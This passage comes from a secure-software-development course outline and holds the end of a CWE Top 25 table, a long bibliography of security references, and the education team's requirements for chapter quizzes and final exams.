  </tr>
  <tr>
    <td>[34]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/862.html">CWE-862</a></td>
    <td>Missing Authorization</td>
  </tr>
  <tr>
    <td>[35]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/532.html">CWE-532</a></td>
    <td>Inclusion of Sensitive Information in Log Files</td>
  </tr>
  <tr>
    <td>[36]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/306.html">CWE-306</a></td>
    <td>Missing Authentication for Critical Function</td>
  </tr>
  <tr>
    <td>[37]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384</a></td>
    <td>Session Fixation (!)</td>
  </tr>
  <tr>
    <td>[38]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326</a></td>
    <td>Inadequate Encryption Strength (!)</td>
  </tr>
  <tr>
    <td>[39]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/770.html">CWE-770</a></td>
    <td>Allocation of Resources Without Limits or Throttling</td>
  </tr>
  <tr>
    <td>[40]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/617.html">CWE-617</a></td>
    <td>Reachable Assertion (!)</td>
  </tr>
</table>

Ones marked with (!) are in the 2019 edition but not the 2021 edition.

# References

(Not part of the course per se)

Aleph One (Elias Levy), *Smashing the Stack for Fun and Profit*, Phrack #49, 1996 (<http://phrack.org/issues/49/14.html#article>)

Amodio, Dan Amodio, "Remote Code with Expression Language Injection", 2012-12-14. (<http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/>)

Anderson, James P., *Computer Security Technology Planning Study*, volume I, ESD-TR-73-51 (Volumes I and II), October 1972 (<https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf>) and (<https://csrc.nist.rip/publications/history/ande72.pdf>)

Anderson, James P., *Computer Security Technology Planning Study*, volume II, 1972 (<https://apps.dtic.mil/dtic/tr/fulltext/u2/772806.pdf>)

Anderson, Ross, *Security Engineering: A Guide to Building Dependable Distributed Systems* (<https://www.cl.cam.ac.uk/~rja14/book.html>)

Backus, J.W., R.J. Beeber, S. Best, R. Goldberg, H.L. Herrick, R.A. Hughes, L.B. Mitchell, R.A. Nelson, R. Nutt, D. Sayre, P.B. Sheridan, H. Stern, I. Ziller. *The FORTRAN Automatic Coding System for IBM 704 EDPM: Programmer’s Reference Manual*, Applied Science Division and Programming Research Department, International Business Machines Corporation, 1956-10-15 (<https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf>)

Bals, Fred, *The AppSec alphabet soup: A guide to SAST, IAST, DAST, and RASP*, Synopsys “Software Integrity” blog, 2018-08-14 (<https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/>)

Barker, Elaine, *Recommendation for Key Management: Part 1 - General*, NIST Special Publication 800-57 Part 1 Revision 5, 2020,  (<https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf>)

Birsan, Alex, 2021-02-09, “Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies”, (<https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610>)

Bobby Tables, "Java", (<https://bobby-tables.com/java>)

Black, Paul E.; Badger, Lee; Guttman, Barbara; Fong, Elizabeth, *Dramatically Reducing Software Vulnerabilities: Report to the White House Office of Science and Technology Policy*, NISTIR 8151, US National Institute of Standards and Technology (NIST) Information Technology Laboratory, 2016-11 (<https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf>)

Breeden II, John, *9 top fuzzing tools: Finding the weirdest application errors*, 2019 (<https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html>)

Bressers, Josh, *Broken vulnerabilities severities*, 2020-05-25 (<https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/>)

Butler, Ricky W., *What is Formal Methods?* (<https://shemesh.larc.nasa.gov/fm/fm-what.html>)

C FAQ list (<http://c-faq.com/ansi/undef.html>)

Carlini, Nicholas, & David Wagner, 2017,
"Adversarial Examples Are Not Easily Detected: Bypassing Ten Detection Methods”

Carlini, Nicholas Anish Athlye, Nicolas Papernot, et al., “On Evaluating Adversarial Robustness”, 2019-02-20, <https://arxiv.org/pdf/1902.06705>.

Carnegie Mellon University: Software Engineering Institute, CERT Division (<https://sei.cmu.edu/about/divisions/cert/index.cfm>)

Chen, Raymond, *Undefined behavior can result in time travel (among other things, but time travel is the funkiest)*, 2014-06-27, (<https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633>)

Cimpanu, Catalin, *Microsoft: 70 percent of all security bugs are memory safe issues*, 2019-02-11 (<https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/>)

Cimpanu, Catalin, "Two malicious Python libraries caught stealing SSH and GPG keys", ZDNet, 2019-12-03, <https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi>

CISCO, *Next Generation Cryptography* (<https://tools.cisco.com/security/center/resources/next_generation_cryptography>)

Coggeshall, John, *Updating the Git protocol for SHA-256*, 2020 (<https://lwn.net/Articles/823352/>)

Commission Nationale Informatique & Libertés (CNIL), *The CNIL’s Guides: Security of Personal Data*, 2018 (<https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf>)

Commission Nationale Informatique & Libertés (CNIL), *Solutions for a responsible use of the blockchain in the context of personal data*, 2018 (<https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf>)

Common Criteria, *Common Criteria for Information Technology Security Evaluation (CC) part 2* (<https://www.commoncriteriaportal.org/>)

Corbet, Jonathan, *A new hash algorithm for Git*, 2020 (<https://lwn.net/Articles/811068/>)

Cox, Ben,  “Auditing GitHub users’ SSH key quality”, 2015-06-02 (<https://blog.benjojo.co.uk/post/auditing-github-users-keys>)

Cybersecurity & Infrastructure Security Agency (CISA), Emergency Directive 21-01, (<https://www.cisa.gov/emergency-directive-21-01>)
Cybersecurity & Infrastructure Security Agency (CISA), Alert AA20-352A, (<https://www.cisa.gov/uscert/ncas/alerts/aa20-352a>)

Dechand, Sergej, *What is FAST?*, 2020 (<https://blog.code-intelligence.com/what-is-fast>)

Delaitre, Aurelien; Stivalet, Bertrand; Black, Paul E.; Okun, Vadim; Ribeiro, Athos; Cohen, Terry S., *SATE V Report: Ten Years of Static Analysis Tool Expositions*, NIST Special Publication 500-326, 2018 (<https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf>) or (<https://doi.org/10.6028/NIST.SP.500-326>)

Di Paola, Stefano, and Arshan Dabirsiaghi. "Expression Language Injection", 2011-09-12, (<https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf>)

Dulin, Maxwell (ꓘ), Finding an Authorization Bypass on my Own Website, 2022-03-03, (<https://maxwelldulin.com/BlogPost?post=9185867776>)

ECMA, ECMA-262, 12th edition, June 2021, ECMAScript® 2021 Language Specification, “The Number Type” ([https://www.ecma-international.org/ecma-262/11.0/index.html#sec-ecmascript-language-types-number-type](\(https://www.ecma-international.org/ecma-262/11.0/index.html#sec-ecmascript-language-types-number-type\))

Enable Cross-Origin Resource Sharing (<https://enable-cors.org/>)

Flatt Security Inc,, "Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql", 2022-02-21, (<https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4>)

Forum of Incident Response and Security Teams (FIRST), *FIRST Services Framework* (<https://www.first.org/standards/frameworks/>)

Forum of Incident Response and Security Teams (FIRST), *Product Security Incident Response Team (PSIRT) Services Framework* (<https://www.first.org/standards/frameworks/>)

Forum of Incident Response and Security Teams (FIRST), *Computer Security Incident Response Team (CSIRT) Services Framework* (<https://www.first.org/standards/frameworks/>)

Forum of Incident Response and Security Teams (FIRST), *Guidelines and Practices for Multi-Party Vulnerability Coordination and Disclosure*, (<https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1>)

Forum of Incident Response and Security Teams (FIRST), *Traffic Light Protocol (TLP)* (<https://www.first.org/tlp/>)

Friedl, Jeffrey E.F., *Mastering Regular Expressions*, 3rd Edition, O’Reilly Media,  ISBN 9780596528126, 2006-08 (<https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/>)

Garavel, Hubert, et al, *Formal Methods for Safe and Secure Computers Systems*, BSI Study 875, 2013 (<https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Studien/formal_methods_study_875/formal_methods_study_875.pdf?__blob=publicationFile&v=1>)

Georgiev, Martin; Iyengar, Subodh; Jana, Suman; Anubhai, Rishita; Boneh, Dan; Shmatikov, Vitaly; *The Most Dangerous Code in the World: Validating SSL Certificates in Non-Browser Software*, 2012 (<https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf>)

Gerrand, Andrew, *The Go Blog: Error handling and Go*, 2011 (<https://blog.golang.org/error-handling-and-go>)

GitHub Security, *Password reset emails delivered to the wrong address*, 2016-07-05 (<https://bounty.github.com/researchers/jagracey.html>)

GitLab, *What is GitOps?* (\[https://about.gitlab.com/topics/gitops/])

Goodin, Dan, 2015, "Once seen as bulletproof, 11 million+ Ashley Madison passwords already cracked", *Ars Technica*, <https://arstechnica.com/information-technology/2015/09/once-seen-as-bulletproof-11-million-ashley-madison-passwords-already-cracked/>

Gooding, Dan, *Plundering of crypto keys from ultrasecure SGX sends Intel scrambling again*, Ars Technica, 2020-06-09 (<https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/>)

Google, OSS-Fuzz project (<https://github.com/google/oss-fuzz>)

Greenwald, Glenn, *Why privacy matters*, 2014 (<https://www.ted.com/talks/glenn_greenwald_why_privacy_matters> or <https://www.youtube.com/watch?v=pcSlowAhvUk>)

Hernan, Shawn; Lambert, Scott; Ostwald, Tomasz; Shostack, Adam, *Threat Modeling: Uncover Security Design Flaws Using the STRIDE Approach*, 2006 (<https://web.archive.org/web/20070303103639/http://msdn.microsoft.com/msdnmag/issues/06/11/ThreatModeling/default.aspx>)

Householder, Allen, *The CERT Guide to Coordinated Vulnerability Disclosure*, 2019 (<https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure>)

Hubbard, Douglas, *The Failure of Risk Management: Why It’s Broken and How to Fix It*, John Wiley & Sons. p. 46, 2009 (<https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536>)

IETF RFC 1983, *Internet Users’ Glossary*  (<https://tools.ietf.org/html/rfc1983>)

IETF RFC 3986, *Uniform Resource Identifier (URI): Generic Syntax* (<https://tools.ietf.org/html/rfc3986>)

IETF RFC 5321, section 2.3.11, *Mailbox and Address* (<https://tools.ietf.org/html/rfc5321#section-2.3.11>)

Information Commissioner’s Office (ICO), *Guide to the General Data Protection Regulation (GDPR)* (<https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/>)

International Association for Privacy Professionals (IAPP), *What does privacy mean?* (<https://iapp.org/about/what-is-privacy/>)

ISO/IEC 9899:2018, *Programming Languages - C* (aka “C17”).  This standard is not publicly available; its final draft is publicly available at (<https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf>)

ISO/IEC 15026-2:2011, *Systems and software engineering - Systems and software assurance - Part 2: Assurance case* (<https://www.iso.org/standard/52926.html>)

Kaplan-Moss, Jacob, *Not all attackers are equal: understanding and preventing DOS in web applications*, 2020 (<https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/>)

kernel.org, *Linux kernel coding style* (<https://www.kernel.org/doc/Documentation/process/coding-style.rst>)

Levien, Raph, *With Undefined Behavior, Anything is Possible*, 2018-08-17, (<https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html>)

Linux Foundation, *Understanding Open Source Technology & US Export Controls*, 2021-07-19, <https://www.linuxfoundation.org/tools/understanding-us-export-controls-with-open-source-projects/>)

Loukides, Mike, *Revisiting “What Is DevOps”*, 2014-06-30 (<http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html>)

MacCarthaigh, Colm, *Automated Reasoning and Amazon s2n*, 2016-09-08 (<https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/>)

Microsoft, *Naming Files, Paths and Namespaces* (<http://msdn.microsoft.com/en-us/library/aa365247.aspx>)

Microsoft, *Threat Modeling* (<https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling>)

Microsoft, *Timing vulnerabilities with CBC-mode symmetric decryption using padding*, 2020-07-15 (<https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode>)

Microsoft,  “3 Ways to Mitigate Risk When Using Private Package Feeds”, (<https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/>)

Minocha, Shreyas, *Regular Expressions for Regular Folk* (<https://refrf.shreyasminocha.me/>)

Mitchell, Tom, 1997, *Machine Learning*. New York: McGraw Hill. ISBN 0-07-042807-7. OCLC 36417892.

MITRE (<https://www.mitre.org/>)

MITRE, Common Weakness Enumeration (CWE) (<https://cwe.mitre.org/>)

MITRE, Common Weakness Enumeration (CWE), *2019 CWE Top 25 Most Dangerous Software Errors* (<https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html>)

Mozilla, *Cross-Origin Resource Sharing (CORS)* (<https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS>)

Mozilla wiki, *Oxidation* (<https://wiki.mozilla.org/Oxidation>)

Mozilla wiki, *Security/Server Side TLS* (<https://wiki.mozilla.org/Security/Server_Side_TLS>)

Mozilla, Rust vs. C++ in macOS Firefox Nightly (<https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479>)

Mozilla, *Same-Origin Policy* (<https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy>)

National Vulnerability Database (NVD), CVE-2021-44228, (<https://nvd.nist.gov/vuln/detail/CVE-2021-44228>)

Newcombe, Chris; Rath, Tim; Zhang, Fan; Munteanu, Bogdan; Brooker, Marc; Daerdeuff, Michael, *Use of Formal Methods at Amazon Web Services*, 2014-09-29 (<https://lamport.azurewebsites.net/tla/formal-methods-amazon.pdf>)

Newcombe, Chris; Rath, Tim; Zhang, Fan; Munteanu, Bogdan; Brooker, Marc; Daerdeuff, Michael, *How Amazon Web Services Uses Formal Methods*, Communications of the ACM, Vol. 58 No. 4, Pages 66-73, 10.1145/2699417, 2015-04 (<https://cacm.acm.org/magazines/2015/4/184701-how-amazon-web-services-uses-formal-methods/fulltext>)

Nicolae, Maria-Irina, Mathieu Sinn, Minh Ngoc Tran, Beat Buesser, Ambrish Rawat, Martin Wistuba, Valentina Zantedeschi, Nathalie Baracaldo, Bryant Chen, Heiko Ludwig, Ian M. Molloy, Ben Edwards,
Adversarial Robustness Toolbox v1.0.0
2019-11-15
<https://arxiv.org/abs/1807.01069>

Official EU site for the GDPR text (<https://eur-lex.europa.eu/eli/reg/2016/679/oj>)

Ohm, Marc; Plate, Henrik; Sykosch, Arnold; Meier, Michal, *Backstabber’s Knife Collection: A Review of Open Source Software Supply Chain Attacks*, 2020-05-19 (<https://arxiv.org/abs/2005.09535>)

Open Source Security Foundation (OpenSSF), *OpenSSF Best Practices Badge Program* (<https://bestpractices.coreinfrastructure.org/en>)

Open Source Security Foundation (OpenSSF), *BadgeApp Security: Its Assurance Case* (<https://github.com/coreinfrastructure/best-practices-badge/blob/master/doc/security.md>)

Open Source Security Foundation (OpenSSF), Vulnerability Disclosures Working Group (<https://github.com/ossf/wg-vulnerability-disclosures>)

The Open Source Security Foundation (OpenSSF) Vulnerability Disclosures Working Group, Guide to coordinated vulnerability disclosure for open source software projects (<https://github.com/ossf/oss-vulnerability-guide>)

Open Web Application Security Project (OWASP), *OWASP Top 10 Web Application Security Risks* (<https://owasp.org/www-project-top-ten>)

Open Web Application Security Project (OWASP), *OWASP Mobile Top 10* (<https://owasp.org/www-project-mobile-top-10/>)

Open Web Application Security Project (OWASP), *OWASP Internet of Things Project* (<https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project>)

Open Web Application Security Project (OWASP), *Regular expression Denial of Service - ReDoS* (<https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS>)

Open Web Application Security Project (OWASP), *OWASP XML External Entities (XXE)* (<https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html>)

Open Web Application Security Project (OWASP), *Unvalidated Redirects and Forwards Cheat Sheet* (<https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html>)

Open Web Application Security Project (OWASP), *Vulnerability Disclosure Cheat Sheet* (<https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html>)

Qualys, *SSL Server Test* (<https://www.ssllabs.com/ssltest/>)

Patchstack, 2022, State Of WordPress Security In 2021 (<https://patchstack.com/whitepaper/the-state-of-wordpress-security-in-2021/>)

Petro, Dan and Allan Cecil, 2021, You're Doing IoT RNG, DEF CON 29 (<https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng>) with presentation at <https://www.youtube.com/watch?v=Zuqw0-jZh9Y>

Ponemon Institute LLC, *Costs and Consequences of Gaps in Vulnerability Responses*, 2019 (<https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html>)

PostgreSQL, *PostgreSQL 14*, "Command Execution Functions",
(<https://www.postgresql.org/docs/current/libpq-exec.html>).

Rebert, Alexandre; Cha, Sang Kil; Avgerinos, Thanassis; Foote, Jonathan; Warren David; Grieco, Gustavo; Brumley, David, *Optimizing Seed Selection for Fuzzing*, 2014 (<https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf>)

Red Hat, *What Is DevSecOps?* (<https://www.redhat.com/en/topics/devops/what-is-devsecops>)

Red Hat, *What Is GitOps?* (\[https://www.redhat.com/en/topics/devops/what-is-gitops])

Regehr, John, *A Guide to Undefined Behavior in C and C++ (Parts 1-3)*, 2010 (<http://blog.regehr.org/archives/213>)

Reichel, Robert, *How we threat model*, 2020-09-02 (<https://github.blog/2020-09-02-how-we-threat-model/>)

Reproducible Builds project, “Definitions”, (<https://reproducible-builds.org/docs/definition/>)

Ritchey, Diane, "Data Breach Directions: What to Do After an Attack", *Security Magazine*, 2015-02-01, <https://www.securitymagazine.com/articles/86071-data-breach-directions-what-to-do-after-an-attack>

Rogers, Tony, *Falsehoods Programmers Believe About Names - With Examples*, 2018 (<https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/>)

Romailler, Yolan, *The definitive guide to “Modulo Bias and how to avoid it”!* (<https://research.kudelskisecurity.com/2020/07/28/the-definitive-guide-to-modulo-bias-and-how-to-avoid-it/>)

Royce, Winston W., *Managing the Development of Large Systems: Concepts and Techniques*, 1970 (<https://dl.acm.org/doi/10.5555/41765.41801>)

Rust Programming Language, *Recoverable Errors with Result* (<https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html>)

SAFECode training materials (<https://safecode.org/training/>)

SAFECode, *Principles for Software Assurance Assessment*, 2019 (<https://safecode.org/principles-of-software-assurance-assessment/>)

Saltzer, Jerome H., Schroeder, Michael D., *The Protection of Information in Computer Systems*, 1975 (<http://web.mit.edu/Saltzer/www/publications/protection/index.html>)

Scanlon, Thomas, *10 Types of Application Security Testing Tools: When and How to Use Them*, Software Engineering Institute (SEI) Blog, 2018-07-09 (<https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html>)

Schneier, Bruce, *Me on the Equifax Breach: Testimony and Statement for the Record of Bruce Schneier*, Hearing on “Securing Consumers’ Credit Data in the Age of Digital Commerce” before the Subcommittee on Digital Commerce and Consumer Protection, Committee on Energy and Commerce, United States House of Representatives, 2017-11-01 (<https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html>)

Schneier, Bruce, *The Process of Security*, 2000 (<https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html>)

Schneier, Bruce, *The Security Mindset*, 2008-03 (<https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html>)

Schneier, Bruce, *Inside the Twisted Mind of the Security Professional*, Wired, 2008-03-20, <https://www.schneier.com/essays/archives/2008/03/inside_the_twisted_m.html>

Security Headers website for testing headers on publicly accessible sites (<https://securityheaders.com/>)

Security.txt (<https://securitytxt.org/>)

Sentinel Labs, “CVE-2021-45608 | NetUSB RCE Flaw in Millions of End User Routers” (<https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/>)

Shahin, Mojtaba; Babar, Muhammad Ali; Zhu, Liming, *Continuous Integration, Delivery and Deployment: A Systematic Review on Approaches, Tools, Challenges and Practices*, IEEE Access, 2017 (<https://arxiv.org/abs/1703.07019>)

Shevchenko, Nataliya, *Threat Modeling: 12 Available Methods*, 2018 (<https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html>)

Shu, Xiaokui; Ciambrone, Andrew; Yao, Danfeng, *Breaking the Target: An Analysis of Target Data Breach and Lessons Learned*, 2017-01-18 (<https://arxiv.org/pdf/1701.04940.pdf>)

Sim, Darren, *Security Vulnerability and Browser Performance Impact of Target="\_blank”*, 2019-03-23 (<https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547>)

Singh, Animesh, Anupama Murthy, and Christian Kadner,
[Integrate adversarial attacks in a model training pipeline](https://developer.ibm.com/patterns/integrate-adversarial-attacks-model-training-pipeline/),
2018-06-25

SSD Disclosure, SSD Advisory – VestaCP LPE Vulnerabilities, 2021-03-20, (<https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/>)

State of California, *California Online Privacy Protection Act (OPPA)*, 2003 (<https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575>)

State of California, *California Online Privacy Protection Act (OPPA), CHAPTER 22. Internet Privacy Requirements \[22575-22579]*, 2003 (<https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575>)

State of California, *California Consumer Privacy Act (CCPA)*, 2018 (<https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5>)

Stilgherrian, *Relying on bug bounties ‘not appropriate risk management’: Katie Moussouris*, 2019 (<https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/>)

Swift, *Optional Chaining* (<https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html>)

Tabassi, Elham (NIST), Kevin Burns (MITRE), Michael Hadjimichael (MITRE), Andres Molina-Markham (MITRE), Julian Sexton (MITRE),
A Taxonomy and Terminology of Adversarial Machine Learning
NISTIR 8269 (Draft),
October 2019
<https://csrc.nist.gov/publications/detail/nistir/8269/draft>

The Fuzzing Project (<https://fuzzing-project.org/>)

The Linux Foundation, *Summary of GDPR Concepts For Free and Open Source Software Projects*, 2018 (<https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf>)

The Linux Foundation, *Telemetry Data Collection and Usage Policy*, 2019 (<https://www.linuxfoundation.org/telemetry-data-policy/>)

The Open Group, PO*SIX standard - definition of the environ variable*, 2018 (<https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html>)

Thomas, “Myths about /dev/urandom”, (<https://www.2uo.de/myths-about-urandom>)

Trail of Bits, *Seriously, stop using RSA*, 2019 (<https://blog.trailofbits.com/2019/07/08/fuck-rsa/>)

United Nations, *International Covenant on Civil and Political Rights, Article 17*, 1966 (<https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx>)

US Department of Defense (DoD)’s Office of the Deputy Assistant Secretary of Defense for Systems Engineering (OASD SE), *Risk, Issue, and Opportunity Management Guide for Defense Acquisition Programs*, 2017-01 (<http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf>)

US National Institute of Standards and Technology (NIST) Cybersecurity Framework (<https://www.nist.gov/cyberframework>)

US National Institute of Standards and Technology (NIST), National Vulnerability Database (NVD) (<https://nvd.nist.gov/>)

*US Privacy Act of 1974 (5 U.S.C. 552a)* (<https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf>)

VeraCode, *DAST TEST: Benefits of a DAST test for application security*, 2020 (<https://www.veracode.com/security/dast-test>)

WHATWG Fetch Specification (<https://fetch.spec.whatwg.org/#http-extensions>)

Wheeler, David A., *A Sample Security Assurance Case Pattern*, IDA Paper P-9278, 2018-12 (<https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx>)

Wheeler, David A., *Core Infrastructure Initiative (CII) Best Practices Badge in 2019*, 2019-03-14 (<https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf>)

Wheeler, David A., *How to Prevent the next Heartbled*, 2020-07-18 (<https://dwheeler.com/essays/heartbleed.html>)

Wheeler, David A., *The Apple goto fail vulnerability: lessons learned*, 2020-08-13 (<https://dwheeler.com/essays/apple-goto-fail.html>)

Wheeler, David A., “Preventing Supply Chain Attacks like SolarWinds”, *Linux Foundation blog*, 2021-01-13, (<https://linuxfoundation.org/blog/preventing-supply-chain-attacks-like-solarwinds/>)

# Education Team Requirements

The LF education team needs:

1.  overview for each chapter in each of the 3 courses along with learning objectives {This is already done above; see the text after each “Heading 1”)

2.  end of chapter graded quizzes: 3-6 questions, preferably multiple choice style

3.  final exam for each of the 3 courses: 15 questions, preferably multiple choice, different than the ones in the end of chapter quizzes.

Items 2 and 3 are covered in a separate file, to protect their confidentiality.
